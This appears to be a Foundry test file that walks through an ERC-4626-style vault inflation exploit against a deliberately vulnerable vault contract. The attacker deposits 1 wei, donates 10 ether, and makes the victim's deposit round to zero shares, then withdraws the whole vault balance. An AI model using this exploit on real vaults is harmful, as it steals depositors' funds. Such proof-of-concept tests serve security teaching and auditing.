// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/VulnerableVault.sol";

contract VaultInflationTest is Test {
    //set up vault
    VulnerableVault vault;
    //set up addresses for attacker and victim
    address attacker;
    address victim;

    //initialization
    function setUp() public {
        vault = new VulnerableVault();
        //example addresses
        attacker = address(0x1234);
        victim = address(0x5678);
    }

    function testVaultInflation() public {
        // Attacker sets up the Vault
        // Attacker deposits 1 wei, which sets the share rate 1:1
        // 1 share = 1 wei
        vm.startPrank(attacker);
        vm.deal(attacker, 10 ether + 1); // Allocate 101
        vault.deposit{value: 1}();

        // Attacker donates 10 ether, which doesn't modify the share rate
        // So 1 share = 10 ether + 1 wei
        vault.donate{value: 10 ether}();
        vm.stopPrank();

        // Victim is told by the attacker in some scheme or Crypto storage to deposit 10 ether
        vm.startPrank(victim);
        vm.deal(victim, 10 ether); // Allocate 10 ether
        vault.deposit{value: 10 ether}();
        vm.stopPrank();

        //both have put everything in the vault
        assert(address(attacker).balance == 0);
        assert(address(victim).balance == 0);
        //vault holds 20 ether + 1 wei:
        assert(address(vault).balance == 20 ether + 1);

        // Attacker can Withdraw the full amount due to the users shares rounding to zero
        vm.startPrank(attacker);
        vault.withdraw(1);
        vm.stopPrank();

        //Attacker has full balance of the vault
        assert(address(attacker).balance == 20 ether + 1);

        //Vault emptied and victim has zero Ether even though they should have 10 ether
        //Attacker gains 10 ether and Victim has been scammed by the Vault Inflation Exploit
        assert(address(vault).balance == 0);
        assert(address(victim).balance == 0);
    }
}
